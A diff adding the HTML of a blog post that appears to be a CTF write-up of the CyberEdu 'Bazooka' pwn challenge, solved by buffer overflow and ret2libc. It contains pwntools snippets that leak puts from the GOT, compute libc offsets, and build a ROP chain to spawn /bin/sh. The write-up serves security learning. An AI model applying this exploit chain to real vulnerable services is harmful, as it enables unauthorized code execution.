@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CyberEdu Bazooka Writeup | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="CyberEdu, pwn, buffer-overflow, Ret2libc">
+<meta name="description" content="Challenge overview
+We have a problem on the station on Mars, we suspect we would be attacked by some hackers so we put a little protection against them.
+The challenge was proposed by BIT SENTINEL.
+
+At first glance, the pwn_bazooka_bazooka looks like a 64-bit executable, and I didn&rsquo;t immediately notice any obvious buffer overflows or format strings. It takes a message input and a junk input. So let&rsquo;s take a look at the binary.">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/bazooka-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/bazooka-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/bazooka-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="CyberEdu Bazooka Writeup">
+  <meta property="og:description" content="Challenge overview We have a problem on the station on Mars, we suspect we would be attacked by some hackers so we put a little protection against them.
+The challenge was proposed by BIT SENTINEL.
+At first glance, the pwn_bazooka_bazooka looks like a 64-bit executable, and I didn’t immediately notice any obvious buffer overflows or format strings. It takes a message input and a junk input. So let’s take a look at the binary.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-02T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-12-02T00:00:00+00:00">
+    <meta property="article:tag" content="CyberEdu">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Buffer-Overflow">
+    <meta property="article:tag" content="Ret2libc">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CyberEdu Bazooka Writeup">
+<meta name="twitter:description" content="Challenge overview
+We have a problem on the station on Mars, we suspect we would be attacked by some hackers so we put a little protection against them.
+The challenge was proposed by BIT SENTINEL.
+
+At first glance, the pwn_bazooka_bazooka looks like a 64-bit executable, and I didn&rsquo;t immediately notice any obvious buffer overflows or format strings. It takes a message input and a junk input. So let&rsquo;s take a look at the binary.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CyberEdu Bazooka Writeup",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/bazooka-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CyberEdu Bazooka Writeup",
+  "name": "CyberEdu Bazooka Writeup",
+  "description": "Challenge overview We have a problem on the station on Mars, we suspect we would be attacked by some hackers so we put a little protection against them.\nThe challenge was proposed by BIT SENTINEL.\nAt first glance, the pwn_bazooka_bazooka looks like a 64-bit executable, and I didn\u0026rsquo;t immediately notice any obvious buffer overflows or format strings. It takes a message input and a junk input. So let\u0026rsquo;s take a look at the binary.\n",
+  "keywords": [
+    "CyberEdu", "pwn", "buffer-overflow", "Ret2libc"
+  ],
+  "articleBody": "Challenge overview We have a problem on the station on Mars, we suspect we would be attacked by some hackers so we put a little protection against them.\nThe challenge was proposed by BIT SENTINEL.\nAt first glance, the pwn_bazooka_bazooka looks like a 64-bit executable, and I didn’t immediately notice any obvious buffer overflows or format strings. It takes a message input and a junk input. So let’s take a look at the binary.\nWe can see a couple of functions inside the binary, main, helper, l00p, vuln and fake.\nHelper returns savedregs.\nThis function returns fake and displays “Try harder” if our input isn’t \"#!@{try_hard3r}\", and otherwise returns vuln.\nThe fake function takes “junk” input and returns to l00p.\nFinally, our vuln stores input in v1 and outputs “Hacker alert”.\nIdentifying the vulnerabilities About all of these functions (except l00p, because of that strcmp that redirects us) have a buffer overflow vulnerability - this makes me thing about popping a shell. So let’s analyze the binary and see if we can find any /bin/sh in memory.\nWell, I look at that! The libc /bin/sh!\nUsing the buffer overflow in vuln, I made a pop_rdi_ret + helper + p64(elf.plt['puts'] to see if there’s anything interesting in helper but it didn’t seem like it.\nThe exploit Since the program uses ASLR, we can’t just know where /bin/sh and system are going to be. So we could try a ret2libc, and then calculating the offsets.\np.sendline(b\"A\"*112 + b'\\x90'*8 + pop_rdi_ret + p64(elf.got['puts']) + p64(elf.plt['puts']) + l00p) p.recvline() leak = p.recv(6) leaked = u64( leak.ljust(8, b'\\x00')) print(f\"leak: {hex(leaked)}\") puts_offset = 0x585a0 libc = leaked - puts_offset print(f\"libc: {hex(libc)}\") This gets us our libc address successfully!\nNow all that’s left to do is calculate the offsets to /bin/sh and system.\nbinsh_offset = 0x17fea4 binsh = libc + binsh_offset system_offset = 0x2b110 system = libc + system_offset print(f\"binsh: {hex(binsh)}\") print(f\"system: {hex(system)}\") #l00p p.recvuntil(b\": \") p.sendline(b\"#!@{try_hard3r}\") #vuln p.recvuntil(b\": \") #bufoverflow -\u003e ret to l00p p.sendline(b\"A\"*112 + b'\\x90'*8 + pop_rdi_ret + p64(binsh) + p64(system) + l00p) Everything seemed to be going alright, we entered the system function with the correct /bin/sh pointer, but we end up getting a SIGSEGV. Most likely, this is an alignment issue, so let’s find a ret gadget to our payload.\nWe did it!!! All it took was adding the ret gadget like so:\np.sendline(b\"A\"*112 + b'\\x90'*8 + pop_rdi_ret + p64(binsh) + ret + p64(system) + l00p) Different libc versions Now, the worst part - testing remotely.\nUnsurprising… This always happens. I tried moving the ret gadget around, but most probably our version of glibc is different from what they’re using. How are we even supposed to figure it ourselves?\nUsing strings pwn_bazooka_bazooka | grep -i glibc, I tried to take a look at what the binary contains, so we can try the known offsets for 2.27, since it’s the latest version included here.\nSince the challenge came out in 2020, the very latest version it could have been is 2.31. That helps narrow it down a little.\nAnd we can use blukat’s symbols library to find the 2.27 version offsets for puts (found as IO_puts), bin_sh and system.\nIt worked, first try! I’m just glad we didn’t have to go through 5 different libraries to solve this.\nAs always, the rest of the code can be found on my GitHub here.\n",
+  "wordCount" : "559",
+  "inLanguage": "en",
+  "datePublished": "2025-12-02T00:00:00Z",
+  "dateModified": "2025-12-02T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/bazooka-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CyberEdu Bazooka Writeup
+    </h1>
+    <div class="post-meta"><span title='2025-12-02 00:00:00 +0000 UTC'>December 2, 2025</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul><ul>
+                <li>
+                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
+                <li>
+                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a></li>
+                <li>
+                    <a href="#the-exploit" aria-label="The exploit">The exploit</a></li></ul>
+                    
+                <li>
+                    <a href="#different-libc-versions" aria-label="Different libc versions">Different libc versions</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
+<p>We have a problem on the station on Mars, we suspect we would be attacked by some hackers so we put a little protection against them.</p>
+<p><strong><a href="https://app.cyber-edu.co/challenges/ae81c600-347c-11eb-a2b9-a539e3b969ab?tenant=cyberedu">The challenge</a></strong> was proposed by BIT SENTINEL.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/bazooka-writeup/pic1.png#center"></p>
+<p>At first glance, the <strong>pwn_bazooka_bazooka</strong> looks like a 64-bit executable, and I didn&rsquo;t immediately notice any obvious buffer overflows or format strings. It takes a <em>message</em> input and a <em>junk</em> input. So let&rsquo;s take a look at the binary.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/bazooka-writeup/pic2.png#center"></p>
+<p>We can see a couple of functions inside the binary, <code>main</code>, <code>helper</code>, <code>l00p</code>, <code>vuln</code> and <code>fake</code>.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/bazooka-writeup/pic3.png#center"></p>
+<p>Helper returns <code>savedregs</code>.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/bazooka-writeup/pic3.png#center"></p>
+<p>This function returns <code>fake</code> and displays &ldquo;Try harder&rdquo; if our input isn&rsquo;t <code>&quot;#!@{try_hard3r}&quot;</code>, and otherwise returns <code>vuln</code>.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/bazooka-writeup/pic4.png#center"></p>
+<p>The <code>fake</code> function takes &ldquo;junk&rdquo; input and returns to <code>l00p</code>.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/bazooka-writeup/pic5.png#center"></p>
+<p>Finally, our <code>vuln</code> stores input in <code>v1</code> and outputs &ldquo;Hacker alert&rdquo;.</p>
+<hr>
+<h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
+<p>About all of these functions (except <code>l00p</code>, because of that <code>strcmp</code> that redirects us) have a buffer overflow vulnerability - this makes me thing about popping a shell. So let&rsquo;s analyze the binary and see if we can find any <code>/bin/sh</code> in memory.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/bazooka-writeup/pic6.png#center"></p>
+<p>Well, I look at that! The <code>libc</code> <code>/bin/sh</code>!</p>
+<p>Using the buffer overflow in <code>vuln</code>, I made a <code>pop_rdi_ret + helper + p64(elf.plt['puts']</code> to see if there&rsquo;s anything interesting in <code>helper</code> but it didn&rsquo;t seem like it.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/bazooka-writeup/pic7.png#center"></p>
+<hr>
+<h2 id="the-exploit">The exploit<a hidden class="anchor" aria-hidden="true" href="#the-exploit">#</a></h2>
+<p>Since the program uses <code>ASLR</code>, we can&rsquo;t just know where <code>/bin/sh</code> and <code>system</code> are going to be. So we could try a <code>ret2libc</code>, and then calculating the offsets.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">112</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>            pop_rdi_ret <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>            p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]) <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>            p64(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]) <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>            l00p)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)
+</span></span><span style="display:flex;"><span>leaked <span style="color:#f92672">=</span> u64( leak<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;leak: </span><span style="color:#e6db74">{</span>hex(leaked)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x585a0</span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> leaked <span style="color:#f92672">-</span> puts_offset
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc: </span><span style="color:#e6db74">{</span>hex(libc)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>This gets us our <code>libc</code> address successfully!</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/bazooka-writeup/pic9.png#center"></p>
+<p>Now all that&rsquo;s left to do is calculate the offsets to <code>/bin/sh</code> and <code>system</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>binsh_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x17fea4</span>
+</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> binsh_offset
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2b110</span>
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> system_offset
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;binsh: </span><span style="color:#e6db74">{</span>hex(binsh)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;system: </span><span style="color:#e6db74">{</span>hex(system)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#l00p</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;#!@</span><span style="color:#e6db74">{try_hard3r}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#vuln</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#bufoverflow -&gt; ret to l00p</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">112</span> <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>           <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>           pop_rdi_ret <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>           p64(binsh) <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>           p64(system) <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>           l00p)
+</span></span></code></pre></div><p>Everything seemed to be going alright, we entered the <code>system</code> function with the correct <code>/bin/sh</code> pointer, but we end up getting a SIGSEGV. Most likely, this is an alignment issue, so let&rsquo;s find a <code>ret</code> gadget to our payload.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/bazooka-writeup/pic10.png#center"></p>
+<p>We did it!!! All it took was adding the <code>ret</code> gadget like so:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">112</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> pop_rdi_ret <span style="color:#f92672">+</span> p64(binsh) <span style="color:#f92672">+</span> ret <span style="color:#f92672">+</span> p64(system) <span style="color:#f92672">+</span> l00p)
+</span></span></code></pre></div><hr>
+<h1 id="different-libc-versions">Different libc versions<a hidden class="anchor" aria-hidden="true" href="#different-libc-versions">#</a></h1>
+<p>Now, the worst part - testing remotely.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/bazooka-writeup/pic11.png#center"></p>
+<p>Unsurprising&hellip; This always happens. I tried moving the <code>ret</code> gadget around, but most probably our version of <code>glibc</code> is different from what they&rsquo;re using. How are we even supposed to figure it ourselves?</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/bazooka-writeup/pic12.png#center"></p>
+<p>Using <code>strings pwn_bazooka_bazooka | grep -i glibc</code>, I tried to take a look at what the binary contains, so we can try the known offsets for <code>2.27</code>, since it&rsquo;s the latest version included here.</p>
+<p>Since the challenge came out in 2020, the very latest version it could have been is <code>2.31</code>. That helps narrow it down a little.</p>
+<p>And we can use <strong><a href="https://libc.blukat.me/d/libc6_2.27-3ubuntu1.4_amd64.symbols">blukat&rsquo;s symbols library</a></strong> to find the <code>2.27</code> version offsets for <code>puts</code> (found as <code>IO_puts</code>), <code>bin_sh</code> and <code>system</code>.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/bazooka-writeup/pic13.png#center"></p>
+<p>It worked, first try! I&rsquo;m just glad we didn&rsquo;t have to go through 5 different libraries to solve this.</p>
+<hr>
+<p>As always, the rest of the code can be found on my GitHub
+<strong><a href="https://github.com/irinasusca/ctf-writeups/blob/main/pico/bazooka.py">here</a></strong>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/cyberedu/">CyberEdu</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/buffer-overflow/">Buffer-Overflow</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/ret2libc/">Ret2libc</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
